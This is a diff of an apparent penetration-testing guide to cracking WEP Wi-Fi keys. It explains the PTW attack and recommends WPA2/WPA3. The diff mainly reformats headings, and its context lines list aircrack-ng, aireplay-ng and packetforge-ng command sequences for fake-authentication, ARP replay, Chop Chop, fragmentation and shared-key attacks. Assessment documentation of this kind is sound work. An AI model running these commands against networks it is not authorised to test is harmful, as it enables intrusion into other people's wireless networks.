@@ -1,9 +1,9 @@
-### PTW Attack (WEP Cryptographic Exploitation) 
+# PTW Attack (WEP Cryptographic Exploitation) 
 An attacker can recover the WEP keys with relatively few packets. The Pychkine, Tews, Weinmann (PTW) attack utilizes ARP response data and recognizes over 5.5 million weak initialization vectors (IV), leading to WEP key recovery. Collecting 85,000 data frames provides a reasonable probability of success for crucial recovery and can be completed in a few minutes. 
 
 Recommendations: WEP is flawed because it only encrypts data packets and uses the stream cipher RC4. REDSEC recommends implementing a more robust security protocol like WPA2 or WPA3.
 
-WEP Attack Process:
+## WEP Attack Process:
 
     1. Check the SSID and analyze whether SSID is Visible or Hidden.
     2. Check for networks using WEP encryption.
@@ -24,7 +24,7 @@ WEP Attack Process:
            
     10. Once the WEP key is cracked, connect to the network using WPA-supplicant and check if the AP is allotting any IP addresses.
 
-Fake Authentication Attack:
+### Fake Authentication Attack:
 
     1. airmon-ng start wlan0
     2. airodump-ng –c <AP_Channel> --bssid <BSSID> -w <FileName> wlan0mon
@@ -35,7 +35,7 @@ Fake Authentication Attack:
     Other tools that could be used: 
         wifite & Airgeddon.sh (All Attacks in one tool (Replay, Chopchop, Fragment, Hirte, P0841, Caffe-latte)
 
-ARP Replay Attack:
+### ARP Replay Attack:
 
     1. airmon-ng start wlan0
     2. airodump-ng –c <AP_Channel> --bssid <BSSID> -w <FileName> wlan0mon
@@ -43,19 +43,19 @@ ARP Replay Attack:
     4. aireplay-ng -3 –x 1000 –n 1000 –b <BSSID> -h <OurMac> wlan0mon
     5. aircrack-ng –b <BSSID> <PCAP_of_FileName>
 
-Chop Chop Attack:
+### Chop Chop Attack:
 
     1. airmon-ng start wlan0
     2. airodump-ng –c <AP_Channel> --bssid <BSSID> -w <FileName> wlan0mon
     3. macchanger --show wlan0mon
     4. aireplay-ng -1 0 –e <ESSID> -a <BSSID> -h <OurMac> wlan0mon
     5. aireplay-ng -4 –b <BSSID> -h <OurMac> wlan0mon
-     #Press ‘y’ ;
-    6. packetforge-ng -0 –a <BSSID> -h <OurMac> -k <SourceIP> -l <DestinationIP> -y <XOR_PacketFile> -w <FileName2>
-    7. aireplay-ng -2 –r <FileName2> wlan0mon
-    8. aircrack-ng <PCAP_of_FileName>
+    6. #Press ‘y’ ;
+    7. packetforge-ng -0 –a <BSSID> -h <OurMac> -k <SourceIP> -l <DestinationIP> -y <XOR_PacketFile> -w <FileName2>
+    8. aireplay-ng -2 –r <FileName2> wlan0mon
+    9. aircrack-ng <PCAP_of_FileName>
 
-Fragmentation Attack:
+### Fragmentation Attack:
 
     1. airmon-ng start wlan0
     2. airodump-ng –c <AP_Channel> --bssid <BSSID> -w <FileName> wlan0mon
@@ -67,7 +67,7 @@ Fragmentation Attack:
     8. aireplay-ng -2 –r <FileName2> wlan0mon
     9. aircrack-ng <PCAP_of_FileName>
 
-SKA (Shared Key Authentication) Type Cracking:
+### SKA (Shared Key Authentication) Type Cracking:
 
     1. airmon-ng start wlan0
     2. airodump-ng –c <AP_Channel> --bssid <BSSID> -w <FileName> wlan0mon
